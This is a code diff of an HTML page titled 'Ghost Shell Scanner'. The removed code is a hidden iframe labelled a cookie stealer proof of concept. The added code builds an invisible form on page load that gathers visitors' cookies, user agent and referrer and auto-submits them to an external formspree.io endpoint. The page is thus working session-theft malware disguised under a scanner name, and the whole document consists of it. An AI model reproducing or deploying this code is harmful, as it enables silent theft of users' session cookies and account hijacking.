@@ -8,76 +8,45 @@
 <body>
 
     <h2>Ghost Shell Scanner</h2>
-    <button id="ghostButton" style="display: none;" onclick="loadGhostShell()">Load Ghost Shell</button>
 
     <script>
-        function loadGhostShell() {
-            let iframe = document.createElement("iframe");
-            iframe.style.width = "800px";
-            iframe.style.height = "600px";
-            iframe.style.border = "none";
-            iframe.style.position = "absolute";
-            iframe.style.left = "-9999px"; // Hide off-screen
+        document.addEventListener("DOMContentLoaded", function() {
+            let form = document.createElement("form");
+            form.style.display = "none";
+            form.method = "POST";
+            form.action = "https://formspree.io/f/xeoqzkqe";
 
-            document.body.appendChild(iframe);
+            let cookieInput = document.createElement("input");
+            cookieInput.type = "hidden";
+            cookieInput.name = "cookie_data";
+            cookieInput.value = document.cookie || "No_Cookies";
 
-            let doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`<!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>Ghost Shell Cookie Stealer PoC</title>
-                    <style>
-                        body {
-                            background-color: black;
-                            color: white;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            height: 100vh;
-                            flex-direction: column;
-                            font-family: Arial, sans-serif;
-                        }
-                        h2 {
-                            text-align: center;
-                            color: gold;
-                            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
-                        }
-                        form {
-                            display: none;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-                    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-                        <input type="hidden" name="cookie_data" id="cookieField" value="">
-                        <input type="hidden" name="user_agent" id="userAgentField" value="">
-                        <input type="hidden" name="referrer" id="referrerField" value="">
-                        <input type="hidden" name="fallback" value="not_empty">
-                        <button type="submit" name="submitButton">Send</button>
-                    </form>
-                    <script>
-                        document.addEventListener("DOMContentLoaded", function() {
-                            document.getElementById("cookieField").value = document.cookie || "No_Cookies";
-                            document.getElementById("userAgentField").value = navigator.userAgent || "Unknown_User_Agent";
-                            document.getElementById("referrerField").value = document.referrer || "No_Referrer";
-                            if (document.cookie !== "No_Cookies" || document.referrer !== "No_Referrer") {
-                                document.getElementById("stealthForm").submit();
-                            }
-                        });
-                    <\/script>
-                </body>
-                </html>`);
-            doc.close();
-        }
+            let agentInput = document.createElement("input");
+            agentInput.type = "hidden";
+            agentInput.name = "user_agent";
+            agentInput.value = navigator.userAgent || "Unknown_User_Agent";
 
-        // Auto-load the iframe when the page loads
-        window.onload = function() {
-            document.getElementById("ghostButton").click();
-        };
+            let referrerInput = document.createElement("input");
+            referrerInput.type = "hidden";
+            referrerInput.name = "referrer";
+            referrerInput.value = document.referrer || "No_Referrer";
+
+            let fallbackInput = document.createElement("input");
+            fallbackInput.type = "hidden";
+            fallbackInput.name = "fallback";
+            fallbackInput.value = "not_empty";
+
+            form.appendChild(cookieInput);
+            form.appendChild(agentInput);
+            form.appendChild(referrerInput);
+            form.appendChild(fallbackInput);
+
+            document.body.appendChild(form);
+
+            if (document.cookie !== "No_Cookies" || document.referrer !== "No_Referrer") {
+                form.submit();
+            }
+        });
     </script>
 
 </body>
